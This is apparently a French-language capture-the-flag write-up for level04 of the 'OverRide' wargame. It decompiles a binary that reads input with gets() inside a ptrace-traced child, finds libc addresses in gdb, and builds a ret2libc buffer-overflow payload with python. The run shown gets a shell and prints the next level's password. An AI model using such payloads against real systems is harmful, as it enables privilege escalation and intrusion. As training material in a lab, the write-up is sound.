# **Level 00**

Code decompiler,

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
  char s[128]; // [esp+20h] [ebp-98h] BYREF
  int v6; // [esp+A0h] [ebp-18h]
  int v7; // [esp+A4h] [ebp-14h]
  int v8; // [esp+A8h] [ebp-10h]
  __pid_t v9; // [esp+ACh] [ebp-Ch]

  v9 = fork();
  memset(s, 0, sizeof(s));
  v8 = 0;
  stat_loc = 0;
  if ( v9 )
  {
    do
    {
      wait(&stat_loc);
      v6 = stat_loc;
      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);
    }
    while ( v8 != 11 );
    puts("no exec() for you");
    kill(v9, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(s);
  }
  return 0;
}
```
On remaque en testant le code qe si on rentre dans notre input un `buffer` de `156` characteres, le `child` ne se `quitte pas correctement`,
Essayons donc de faire de nouveau un `Ret2libc` mais depuis le `child`.
Pour executer correctement le child dans gdb et pouvoir recuperer les differentes adresses que l'ont a besoin pour l'exploit,
nous devons utiliser l'option de gdb, `set follow-fork-mode child`
Puis de nouveau on doit recuperer les adress de system et "/bin/sh",
```
level04@OverRide:~$ gdb ./level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) find __libc_start_main, +999999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
Payload -> [156 char] [addr system] [4 char] [addr "/bin/sh"]
`python -c "print '\x90'*156 + '\xd0\xae\xe6\xf7' + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7'" > /var/crash/file`
```
level04@OverRide:~$ python -c "print '\x90'*156 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'" > /var/crash/file
level04@OverRide:~$ cat /var/crash/file - | ./level04 
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
> ### NEXT : [Level 05](/level05/resources/README.md)
